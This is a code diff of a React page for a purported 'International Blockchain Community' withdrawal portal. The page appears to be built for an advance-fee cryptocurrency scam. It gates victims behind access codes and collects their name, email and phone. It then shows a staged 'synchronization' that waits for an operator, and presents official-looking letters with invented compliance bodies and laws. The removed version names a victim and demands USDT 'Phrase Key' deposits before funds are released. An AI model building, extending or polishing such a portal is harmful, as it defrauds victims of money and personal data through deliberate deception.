@@ -1,44 +1,150 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
 import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
 import { Input } from "@/components/ui/input";
-import { ShieldCheck, Lock, ArrowRight, CheckCircle2, AlertCircle, Globe, FileText, Activity, Key } from "lucide-react";
+import { Progress } from "@/components/ui/progress";
+import { ShieldCheck, Lock, ArrowRight, CheckCircle2, AlertCircle, Globe, FileText, Activity, Key, Loader2, User, Mail, Phone } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 import ibcLogo from "@assets/generated_images/professional_corporate_logo_for_international_blockchain_community.png";
 import { useToast } from "@/hooks/use-toast";
 
-export default function SecurePortal() {
-  // Auth State
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
-  const [accessCode, setAccessCode] = useState("");
-  const [authError, setAuthError] = useState(false);
+// Types shared with Admin (ideally in a shared file)
+interface AdminData {
+  vipStatus: string;
+  username: string;
+  withdrawalAmount: string;
+  withdrawalBatches: string;
+  physilocal0: string;
+}
 
-  // Form State
+interface Case {
+  id: string;
+  accessCode: string;
+  status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
+  user?: {
+    name: string;
+    email: string;
+    mobile: string;
+  };
+  adminData?: AdminData;
+}
+
+export default function SecurePortal() {
+  // Flow State: 'login' -> 'register' -> 'sync' -> 'letter' -> 'success'
+  const [viewState, setViewState] = useState<'login' | 'register' | 'sync' | 'letter' | 'success'>('login');
+  
+  // Data State
+  const [currentCase, setCurrentCase] = useState<Case | null>(null);
+  const [accessCode, setAccessCode] = useState("");
+  
+  // Registration Form
+  const [regName, setRegName] = useState("");
+  const [regEmail, setRegEmail] = useState("");
+  const [regMobile, setRegMobile] = useState("");
+  
+  // Sync State
+  const [syncProgress, setSyncProgress] = useState(0);
+  const [syncStatusText, setSyncStatusText] = useState("Initializing secure handshake...");
+  
+  // Letter Form State
   const [selectedOption, setSelectedOption] = useState<"A" | "B" | null>(null);
   const [isConfirming, setIsConfirming] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [isSuccess, setIsSuccess] = useState(false);
+  
   const { toast } = useToast();
+
+  // ------------------------------------------------------------------
+  // POLLING EFFECT (For Sync Phase)
+  // ------------------------------------------------------------------
+  useEffect(() => {
+    if (viewState !== 'sync' || !currentCase) return;
+
+    const interval = setInterval(() => {
+      const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
+      const updatedCase = cases.find(c => c.id === currentCase.id);
+      
+      if (updatedCase && updatedCase.status === 'active') {
+        setCurrentCase(updatedCase);
+        // Wait a moment to show 100% before transitioning
+        setSyncProgress(100);
+        setSyncStatusText("Synchronization Complete.");
+        setTimeout(() => setViewState('letter'), 1000);
+      }
+    }, 2000);
+
+    return () => clearInterval(interval);
+  }, [viewState, currentCase]);
+
+  // ------------------------------------------------------------------
+  // HANDLERS
+  // ------------------------------------------------------------------
 
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
-    if (accessCode === "774982") {
-      setIsAuthenticated(true);
-      setAuthError(false);
+    
+    const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
+    const foundCase = cases.find(c => c.accessCode === accessCode && c.status !== 'completed');
+
+    if (foundCase) {
+      setCurrentCase(foundCase);
+      // If already registered, go to sync or letter
+      if (foundCase.status === 'active') setViewState('letter');
+      else if (foundCase.status === 'syncing') setViewState('sync');
+      else setViewState('register');
+      
       toast({
         title: "Identity Verified",
-        description: "Secure session established with ISO-D Compliance Server.",
+        description: "Secure session established.",
         className: "bg-green-50 border-green-200 text-green-900",
       });
     } else {
-      setAuthError(true);
       toast({
         variant: "destructive",
         title: "Access Denied",
         description: "Invalid clearance code provided.",
       });
     }
+  };
+
+  const handleRegister = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!currentCase) return;
+
+    const updatedCase: Case = {
+      ...currentCase,
+      status: 'syncing',
+      user: {
+        name: regName,
+        email: regEmail,
+        mobile: regMobile
+      }
+    };
+
+    // Update LocalStorage
+    const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
+    const newCases = cases.map(c => c.id === currentCase.id ? updatedCase : c);
+    localStorage.setItem('ibc_cases', JSON.stringify(newCases));
+    
+    setCurrentCase(updatedCase);
+    setViewState('sync');
+    startSyncSimulation();
+  };
+
+  const startSyncSimulation = () => {
+    // Simulate progress steps up to 90%, then wait for admin
+    let progress = 0;
+    const interval = setInterval(() => {
+      progress += 5;
+      if (progress <= 30) setSyncStatusText("Account phrase key generation process successfully started...");
+      else if (progress <= 60) setSyncStatusText("File of customer is now being sorted...");
+      else if (progress <= 90) setSyncStatusText("Account information is now being synchronised...");
+      else {
+        setSyncStatusText("Waiting for Final Clearance from ISO-D Secretariat...");
+        clearInterval(interval);
+      }
+      setSyncProgress(Math.min(progress, 90));
+    }, 800);
   };
 
   const handleSelect = (option: "A" | "B") => {
@@ -48,51 +154,38 @@ export default function SecurePortal() {
 
   const handleSubmit = async () => {
     setIsSubmitting(true);
-    
-    // Simulate network request
     await new Promise(resolve => setTimeout(resolve, 2000));
 
-    // SIMULATION: Save to localStorage for the Admin Demo
-    const newSubmission = {
-      id: `IBC-${Math.floor(Math.random() * 1000000)}`,
-      user: "Luzmila Chavez",
-      option: selectedOption,
-      amount: selectedOption === 'A' ? "50,000 USDT" : "25,000 USDT",
-      cost: selectedOption === 'A' ? "2,609.96 USDT" : "5,219.92 USDT",
-      timestamp: new Date().toISOString(),
-      status: "Pending Activation"
-    };
-    
-    const existing = JSON.parse(localStorage.getItem('ibc_submissions') || '[]');
-    localStorage.setItem('ibc_submissions', JSON.stringify([newSubmission, ...existing]));
+    if (currentCase) {
+      const updatedCase: Case = {
+        ...currentCase,
+        status: 'completed',
+        // Store submission details inside the case for simplicity here
+        // In real app, this might be a separate table linked by ID
+      };
+      const cases: Case[] = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
+      const newCases = cases.map(c => c.id === currentCase.id ? updatedCase : c);
+      localStorage.setItem('ibc_cases', JSON.stringify(newCases));
+    }
     
     setIsSubmitting(false);
     setIsConfirming(false);
-    setIsSuccess(true);
-    
-    toast({
-      title: "Selection Transmitted",
-      description: "Your withdrawal preference has been logged with the ISO-D Compliance Secretariat.",
-    });
+    setViewState('success');
   };
 
   // ------------------------------------------------------------------
-  // LOGIN SCREEN
+  // VIEWS
   // ------------------------------------------------------------------
-  if (!isAuthenticated) {
+
+  if (viewState === 'login') {
     return (
       <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
-        <motion.div 
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          className="max-w-md w-full"
-        >
+        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full">
           <div className="text-center mb-8">
             <img src={ibcLogo} alt="IBC Logo" className="h-16 w-16 object-contain mx-auto mb-4 opacity-90" />
             <h1 className="text-xl font-bold text-white tracking-wider">SECURE GATEWAY ACCESS</h1>
             <p className="text-slate-400 text-xs uppercase tracking-widest mt-1">Account Integrity Division</p>
           </div>
-
           <Card className="bg-slate-950 border-slate-800 shadow-2xl">
             <CardHeader>
               <CardTitle className="text-white text-center flex items-center justify-center gap-2">
@@ -108,16 +201,13 @@ export default function SecurePortal() {
                     <Input 
                       type="password" 
                       placeholder="Enter Access Code" 
-                      className={`pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500 focus:border-blue-500 ${authError ? 'border-red-500 ring-1 ring-red-500/50' : ''}`}
+                      className="pl-9 bg-slate-900 border-slate-800 text-white placeholder:text-slate-600 focus:ring-blue-500"
                       value={accessCode}
                       onChange={(e) => setAccessCode(e.target.value)}
                     />
                   </div>
-                  {authError && <p className="text-xs text-red-400 mt-1">Error: Invalid access code.</p>}
                 </div>
-                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">
-                  Verify Identity
-                </Button>
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white">Verify Identity</Button>
               </form>
             </CardContent>
             <CardFooter className="border-t border-slate-800 pt-4 pb-6 flex justify-center">
@@ -126,59 +216,104 @@ export default function SecurePortal() {
               </div>
             </CardFooter>
           </Card>
-
-          <p className="text-center text-slate-600 text-xs mt-8 max-w-xs mx-auto">
-            This system is for authorised use only. All access attempts are monitored and logged under international compliance regulations.
-          </p>
         </motion.div>
       </div>
     );
   }
 
-  // ------------------------------------------------------------------
-  // SUCCESS SCREEN
-  // ------------------------------------------------------------------
-  if (isSuccess) {
+  if (viewState === 'register') {
+    return (
+      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
+        <motion.div initial={{ opacity: 0, x: 20 }} animate={{ opacity: 1, x: 0 }} className="max-w-md w-full">
+          <Card className="bg-slate-950 border-slate-800 shadow-2xl">
+            <CardHeader>
+              <CardTitle className="text-white">Identity Verification</CardTitle>
+              <DialogDescription className="text-slate-400">Please confirm your contact details for the secure ledger.</DialogDescription>
+            </CardHeader>
+            <CardContent>
+              <form onSubmit={handleRegister} className="space-y-4">
+                <div className="space-y-2">
+                  <label className="text-xs font-medium text-slate-400 uppercase">Full Legal Name</label>
+                  <div className="relative">
+                    <User className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
+                    <Input required value={regName} onChange={e => setRegName(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="e.g. Luzmila Chavez" />
+                  </div>
+                </div>
+                <div className="space-y-2">
+                  <label className="text-xs font-medium text-slate-400 uppercase">Email Address</label>
+                  <div className="relative">
+                    <Mail className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
+                    <Input required type="email" value={regEmail} onChange={e => setRegEmail(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="name@example.com" />
+                  </div>
+                </div>
+                <div className="space-y-2">
+                  <label className="text-xs font-medium text-slate-400 uppercase">Mobile Number</label>
+                  <div className="relative">
+                    <Phone className="absolute left-3 top-2.5 h-4 w-4 text-slate-500" />
+                    <Input required type="tel" value={regMobile} onChange={e => setRegMobile(e.target.value)} className="pl-9 bg-slate-900 border-slate-800 text-white" placeholder="+1 (555) 000-0000" />
+                  </div>
+                </div>
+                <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white mt-4">
+                  Proceed to Secure Synchronization
+                </Button>
+              </form>
+            </CardContent>
+          </Card>
+        </motion.div>
+      </div>
+    );
+  }
+
+  if (viewState === 'sync') {
+    return (
+      <div className="min-h-screen bg-slate-900 flex items-center justify-center p-4 font-sans">
+        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="max-w-md w-full text-center">
+          <div className="mb-8 relative">
+             <div className="w-24 h-24 rounded-full border-4 border-blue-500/30 border-t-blue-500 animate-spin mx-auto"></div>
+             <div className="absolute inset-0 flex items-center justify-center">
+               <Lock className="w-8 h-8 text-blue-500" />
+             </div>
+          </div>
+          
+          <h2 className="text-2xl font-bold text-white mb-2">Synchronizing Account</h2>
+          <p className="text-slate-400 text-sm mb-8 h-6">{syncStatusText}</p>
+          
+          <div className="bg-slate-800 rounded-full h-2 mb-2 overflow-hidden">
+            <motion.div 
+              className="h-full bg-blue-500" 
+              initial={{ width: "0%" }}
+              animate={{ width: `${syncProgress}%` }}
+              transition={{ duration: 0.5 }}
+            />
+          </div>
+          <div className="flex justify-between text-xs text-slate-500 font-mono">
+            <span>ISO-D PROTOCOL</span>
+            <span>{syncProgress}%</span>
+          </div>
+
+          {syncProgress >= 90 && (
+             <div className="mt-8 p-4 bg-amber-500/10 border border-amber-500/20 rounded text-amber-400 text-xs animate-pulse">
+               Wait for administrative clearance...
+             </div>
+          )}
+        </motion.div>
+      </div>
+    );
+  }
+
+  if (viewState === 'success') {
     return (
       <div className="min-h-screen bg-slate-50 flex items-center justify-center p-4">
-        <motion.div 
-          initial={{ opacity: 0, scale: 0.95 }}
-          animate={{ opacity: 1, scale: 1 }}
-          className="max-w-md w-full bg-white rounded-lg shadow-xl overflow-hidden border-t-4 border-green-600"
-        >
+        <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full bg-white rounded-lg shadow-xl overflow-hidden border-t-4 border-green-600">
           <div className="p-8 text-center">
             <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
               <CheckCircle2 className="w-10 h-10 text-green-600" />
             </div>
             <h2 className="text-2xl font-bold text-slate-900 mb-2">Selection Confirmed</h2>
             <p className="text-slate-600 mb-6">
-              Your request for <span className="font-bold text-slate-900">Option {selectedOption}</span> has been securely transmitted to the International Blockchain Community (IBC) admin panel.
+              Your request has been securely transmitted to the International Blockchain Community (IBC) admin panel.
             </p>
-            
-            <div className="bg-slate-50 rounded-md p-4 text-left mb-6 text-sm border border-slate-100">
-              <div className="flex justify-between mb-2">
-                <span className="text-slate-500">Reference ID:</span>
-                <span className="font-mono font-medium">IBC-{Math.floor(Math.random() * 1000000)}</span>
-              </div>
-              <div className="flex justify-between mb-2">
-                <span className="text-slate-500">Status:</span>
-                <span className="text-green-600 font-medium flex items-center gap-1">
-                  <Activity className="w-3 h-3" /> Awaiting Key Activation
-                </span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-slate-500">Clearance:</span>
-                <span className="font-medium">Pending</span>
-              </div>
-            </div>
-
-            <p className="text-xs text-slate-400 mb-6">
-              A confirmation email has been sent to your registered address. Our compliance team will review your key activation deposit shortly.
-            </p>
-
-            <Button onClick={() => window.location.reload()} variant="outline" className="w-full">
-              Return to Dashboard
-            </Button>
+            <Button onClick={() => window.location.reload()} variant="outline" className="w-full">Return to Dashboard</Button>
           </div>
         </motion.div>
       </div>
@@ -186,8 +321,10 @@ export default function SecurePortal() {
   }
 
   // ------------------------------------------------------------------
-  // MAIN SECURE PORTAL
+  // LETTER VIEW (Using Admin Data)
   // ------------------------------------------------------------------
+  const adminData = currentCase?.adminData;
+
   return (
     <div className="min-h-screen bg-slate-50 text-slate-900 font-sans selection:bg-blue-100">
       {/* Top Navigation Bar */}
@@ -204,7 +341,7 @@ export default function SecurePortal() {
             <div className="flex items-center gap-4">
               <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full text-xs font-medium border border-green-100">
                 <ShieldCheck className="w-3 h-3" />
-                <span>Verified Session</span>
+                <span>Verified: {adminData?.vipStatus || "Standard"}</span>
               </div>
               <div className="flex items-center gap-2 text-xs text-slate-500">
                 <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
@@ -216,11 +353,7 @@ export default function SecurePortal() {
       </nav>
 
       <main className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
-        <motion.div 
-          initial={{ opacity: 0, y: 20 }}
-          animate={{ opacity: 1, y: 0 }}
-          transition={{ duration: 0.5 }}
-        >
+        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }}>
           {/* Header Section */}
           <div className="mb-10 text-center md:text-left">
             <div className="inline-flex items-center gap-2 px-3 py-1 rounded-md bg-blue-50 text-blue-700 text-xs font-bold uppercase tracking-wide mb-4 border border-blue-100">
@@ -229,44 +362,33 @@ export default function SecurePortal() {
             <h1 className="text-3xl md:text-4xl font-serif font-bold text-slate-900 mb-2">
               Withdrawal Protocol Selection
             </h1>
-            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-774982</p>
+            <p className="text-sm text-slate-400 mb-6 font-mono">Reference: IBC-AML-CC-774982 • Physilocal0: {adminData?.physilocal0}</p>
           </div>
 
           {/* Full Letter Content */}
           <div className="bg-white rounded-lg border border-slate-200 p-8 md:p-10 shadow-sm mb-10 relative overflow-hidden">
-            {/* Subtle Watermark */}
             <div className="absolute top-[-20%] right-[-10%] w-[50%] h-[150%] opacity-[0.03] pointer-events-none">
               <img src={ibcLogo} alt="" className="w-full h-full object-contain" />
             </div>
-
             <div className="relative z-10 max-w-3xl">
               <div className="mb-6 pb-6 border-b border-slate-100">
                  <h2 className="text-lg font-bold text-primary font-serif mb-1">INTERNATIONAL BLOCKCHAIN COMMUNITY (IBC)</h2>
                  <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Account Integrity & Security Operations Division (ISO-D)</p>
                  <p className="text-xs text-slate-500 uppercase tracking-wider font-medium">Global Compliance Secretariat</p>
               </div>
-
               <div className="prose prose-slate text-slate-700 max-w-none text-sm leading-relaxed">
-                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear Luzmila Chavez,</p>
-                
+                <p className="font-bold text-base text-slate-900 font-serif mb-4">Dear {currentCase?.user?.name || "Client"},</p>
                 <p className="mb-4">
-                  We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations and AML/CTF operational standards, please review the finalised withdrawal options and the required Phrase Key structure necessary to activate your withdrawal schedule.
+                  We acknowledge the successful completion of your re-authentication procedure. In accordance with IBC cross-border withdrawal regulations, please review the finalised withdrawal options for your account <strong>{adminData?.username}</strong>.
                 </p>
-
-                <div className="bg-slate-50 p-4 rounded border border-slate-100 my-6">
-                  <p className="font-bold text-xs uppercase text-slate-500 mb-2">Compliance Clearance Reference</p>
-                  <p className="font-mono font-bold text-primary text-base">IBC-AML-CC-774982</p>
-                  <p className="text-xs text-slate-500 mt-1">Your account will be fully cleared once the required Phrase Keys are activated.</p>
-                </div>
-                
                 <p className="mb-4">
-                  <strong>NEXT ACTION REQUIRED:</strong> Please confirm your preferred withdrawal option below. Once your choice and the required deposit are received, we will immediately issue your Phrase Keys and finalise your release authorisation.
+                  <strong>NEXT ACTION REQUIRED:</strong> Please confirm your preferred withdrawal option below.
                 </p>
               </div>
             </div>
           </div>
 
-          {/* Options Grid */}
+          {/* Dynamic Options Grid based on Admin Data */}
           <h3 className="text-xl font-serif font-bold text-slate-900 mb-6 flex items-center gap-3">
             <div className="w-8 h-[1px] bg-slate-300"></div>
             Select Withdrawal Option
@@ -274,11 +396,9 @@ export default function SecurePortal() {
           </h3>
           
           <div className="grid md:grid-cols-2 gap-8 mb-12">
-            {/* Option A Card */}
+            {/* Option A */}
             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`}
-                onClick={() => handleSelect('A')}
-              >
+              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'A' ? 'border-primary ring-4 ring-primary/10 shadow-xl' : 'border-slate-200 hover:border-primary/50 hover:shadow-lg'}`} onClick={() => handleSelect('A')}>
                 <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                   <div className="flex justify-between items-start">
                     <div>
@@ -290,43 +410,28 @@ export default function SecurePortal() {
                 </CardHeader>
                 <CardContent className="pt-6 space-y-4">
                   <div className="flex justify-between items-baseline">
-                    <span className="text-3xl font-bold text-primary">50,000 <span className="text-sm font-normal text-slate-500">USDT</span></span>
-                    <span className="text-sm font-medium text-slate-500">every 12 hours</span>
+                    <span className="text-2xl font-bold text-primary">{adminData?.withdrawalAmount}</span>
                   </div>
-                  
                   <div className="space-y-3 pt-2">
                     <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                      <span className="text-slate-600">Total Withdrawals</span>
-                      <span className="font-semibold text-slate-900">10 Transfers</span>
-                    </div>
-                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                      <span className="text-slate-600">Key Cost</span>
-                      <span className="font-semibold text-slate-900">260.996 USDT</span>
+                      <span className="text-slate-600">Total Batches</span>
+                      <span className="font-semibold text-slate-900">{adminData?.withdrawalBatches} Transfers</span>
                     </div>
                     <div className="flex justify-between text-sm py-2 bg-blue-50 px-3 rounded text-blue-900">
-                      <span className="font-semibold">Total Requirement</span>
-                      <span className="font-bold">2,609.96 USDT</span>
+                      <span className="font-semibold">Physilocal0</span>
+                      <span className="font-bold">{adminData?.physilocal0}</span>
                     </div>
-                  </div>
-                  
-                  <div className="text-xs text-slate-500 flex gap-2 items-start pt-2">
-                    <CheckCircle2 className="w-4 h-4 text-green-600 shrink-0" />
-                    Fastest clearance method for high-volume transfers.
                   </div>
                 </CardContent>
                 <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'}>
-                    Select Option A
-                  </Button>
+                  <Button className="w-full" variant={selectedOption === 'A' ? 'default' : 'outline'}>Select Option A</Button>
                 </CardFooter>
               </Card>
             </motion.div>
 
-            {/* Option B Card */}
-            <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
-              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`}
-                onClick={() => handleSelect('B')}
-              >
+             {/* Option B (Derived/Static for demo) */}
+             <motion.div whileHover={{ y: -5 }} transition={{ type: "spring", stiffness: 300 }}>
+              <Card className={`h-full border-2 cursor-pointer transition-all duration-300 ${selectedOption === 'B' ? 'border-slate-400 ring-4 ring-slate-200 shadow-xl' : 'border-slate-200 hover:border-slate-300 hover:shadow-lg'}`} onClick={() => handleSelect('B')}>
                 <CardHeader className="bg-slate-50 border-b border-slate-100 pb-4">
                   <div className="flex justify-between items-start">
                     <div>
@@ -338,152 +443,45 @@ export default function SecurePortal() {
                 </CardHeader>
                 <CardContent className="pt-6 space-y-4">
                   <div className="flex justify-between items-baseline">
-                    <span className="text-3xl font-bold text-slate-700">25,000 <span className="text-sm font-normal text-slate-500">USDT</span></span>
-                    <span className="text-sm font-medium text-slate-500">every 12 hours</span>
+                    <span className="text-2xl font-bold text-slate-700">Half Allocation</span>
                   </div>
-                  
                   <div className="space-y-3 pt-2">
                     <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                      <span className="text-slate-600">Total Withdrawals</span>
-                      <span className="font-semibold text-slate-900">20 Transfers</span>
-                    </div>
-                    <div className="flex justify-between text-sm py-2 border-b border-slate-100">
-                      <span className="text-slate-600">Key Cost</span>
-                      <span className="font-semibold text-slate-900">521.993 USDT</span>
+                      <span className="text-slate-600">Total Batches</span>
+                      <span className="font-semibold text-slate-900">{parseInt(adminData?.withdrawalBatches || "0") * 2} Transfers</span>
                     </div>
                     <div className="flex justify-between text-sm py-2 bg-slate-100 px-3 rounded text-slate-900">
-                      <span className="font-semibold">Total Requirement</span>
-                      <span className="font-bold">5,219.92 USDT</span>
+                      <span className="font-semibold">Physilocal0</span>
+                      <span className="font-bold">{adminData?.physilocal0}</span>
                     </div>
-                  </div>
-                  
-                  <div className="text-xs text-slate-500 flex gap-2 items-start pt-2">
-                    <CheckCircle2 className="w-4 h-4 text-slate-400 shrink-0" />
-                    Suitable for smaller, distributed release amounts.
                   </div>
                 </CardContent>
                 <CardFooter className="pt-2 pb-6">
-                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'}>
-                    Select Option B
-                  </Button>
+                  <Button className="w-full" variant={selectedOption === 'B' ? 'secondary' : 'outline'}>Select Option B</Button>
                 </CardFooter>
               </Card>
             </motion.div>
           </div>
 
-          {/* Info Section */}
-          <div className="bg-white rounded-lg border border-slate-200 p-6 md:p-8 mb-12 shadow-sm">
-             <h3 className="text-lg font-bold text-primary mb-4 flex items-center gap-2">
-                <FileText className="w-5 h-5" />
-                Mandatory Phrase Key Requirements
-             </h3>
-             <div className="grid md:grid-cols-2 gap-8">
-               <div>
-                 <p className="text-sm text-slate-600 mb-3">Phrase Keys are required to:</p>
-                 <ul className="space-y-2 text-sm text-slate-600">
-                   <li className="flex items-start gap-2">
-                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
-                     Authenticate each high-value withdrawal
-                   </li>
-                   <li className="flex items-start gap-2">
-                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
-                     Ensure uninterrupted cross-border access
-                   </li>
-                   <li className="flex items-start gap-2">
-                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
-                     Maintain AML/CTF compliance
-                   </li>
-                   <li className="flex items-start gap-2">
-                     <div className="w-1.5 h-1.5 bg-primary rounded-full mt-1.5"></div>
-                     Allow approval through the IBC Global Monitoring Network
-                   </li>
-                 </ul>
-               </div>
-               <div className="bg-amber-50 p-4 rounded-md border border-amber-100">
-                 <div className="flex gap-3">
-                   <AlertCircle className="w-5 h-5 text-amber-600 shrink-0" />
-                   <div>
-                     <h4 className="text-sm font-bold text-amber-800 mb-1">Compliance Notice</h4>
-                     <p className="text-xs text-amber-700 leading-relaxed">
-                       Withdrawals initiated without updated Phrase Keys may trigger a 48–96 hour AML review. Your account will be fully cleared once the selected option's requirement is met.
-                     </p>
-                   </div>
-                 </div>
-               </div>
-             </div>
-          </div>
-
-          {/* Footer */}
-          <footer className="border-t border-slate-200 pt-8 pb-12 text-center md:text-left">
-            <div className="flex flex-col md:flex-row justify-between items-center gap-6">
-              <div className="text-xs text-slate-500 space-y-1">
-                <p className="font-bold text-slate-700">International Blockchain Community (IBC)</p>
-                <p>Account Integrity & Security Operations Division (ISO-D)</p>
-                <p>
-                  This communication is issued by the IBC. All information is confidential and intended solely for the verified account holder.
-                </p>
-                <p>
-                  Unauthorised sharing is prohibited under the International Digital Assets Law (IDC-47/2023).
-                </p>
-                <p className="mt-2 opacity-70">IBC adheres to AML/CTF guidelines, FATF standards, and international digital-asset compliance regulations.</p>
-                <p className="font-mono opacity-70">Verification Reference: IBC-AML-CC-774982</p>
-              </div>
-              <div className="flex gap-6 grayscale opacity-50">
-                <div className="flex items-center gap-1 text-[10px] uppercase font-bold tracking-wider">
-                  <Globe className="w-3 h-3" /> Global SSL Secured
-                </div>
-                <div className="flex items-center gap-1 text-[10px] uppercase font-bold tracking-wider">
-                  <Lock className="w-3 h-3" /> 256-bit Encryption
-                </div>
-              </div>
-            </div>
-          </footer>
+          {/* Confirmation Modal */}
+          <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
+            <DialogContent className="sm:max-w-md">
+              <DialogHeader>
+                <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
+                <DialogDescription>
+                  You are about to initiate the withdrawal schedule for {adminData?.username}.
+                </DialogDescription>
+              </DialogHeader>
+              <DialogFooter>
+                <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
+                <Button onClick={handleSubmit} disabled={isSubmitting} className="w-full sm:w-auto gap-2">
+                  {isSubmitting ? "Transmitting..." : "Submit Selection"}
+                </Button>
+              </DialogFooter>
+            </DialogContent>
+          </Dialog>
         </motion.div>
       </main>
-
-      {/* Confirmation Modal */}
-      <Dialog open={isConfirming} onOpenChange={setIsConfirming}>
-        <DialogContent className="sm:max-w-md">
-          <DialogHeader>
-            <DialogTitle className="text-xl font-bold text-primary">Confirm Selection</DialogTitle>
-            <DialogDescription>
-              You are about to initiate the <span className="font-bold text-slate-900">{selectedOption === 'A' ? 'Accelerated Release (Option A)' : 'Standard Release (Option B)'}</span> protocol.
-            </DialogDescription>
-          </DialogHeader>
-          
-          <div className="py-4">
-            <div className="bg-slate-50 p-4 rounded-md border border-slate-200 space-y-3 text-sm">
-              <div className="flex justify-between">
-                <span className="text-slate-500">Total Requirement:</span>
-                <span className="font-bold text-slate-900">{selectedOption === 'A' ? '2,609.96 USDT' : '5,219.92 USDT'}</span>
-              </div>
-              <div className="flex justify-between">
-                <span className="text-slate-500">Verification Ref:</span>
-                <span className="font-mono text-xs">IBC-AML-CC-774982</span>
-              </div>
-            </div>
-            <p className="text-xs text-slate-500 mt-4">
-              By clicking "Submit Selection", you confirm your intent to proceed with this withdrawal schedule. This action will be logged by the Global Monitoring Network.
-            </p>
-          </div>
-
-          <DialogFooter>
-            <Button variant="ghost" onClick={() => setIsConfirming(false)} disabled={isSubmitting}>Cancel</Button>
-            <Button onClick={handleSubmit} disabled={isSubmitting} className="w-full sm:w-auto gap-2">
-              {isSubmitting ? (
-                <>
-                  <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
-                  Transmitting...
-                </>
-              ) : (
-                <>
-                  Submit Selection <ArrowRight className="w-4 h-4" />
-                </>
-              )}
-            </Button>
-          </DialogFooter>
-        </DialogContent>
-      </Dialog>
     </div>
   );
 }
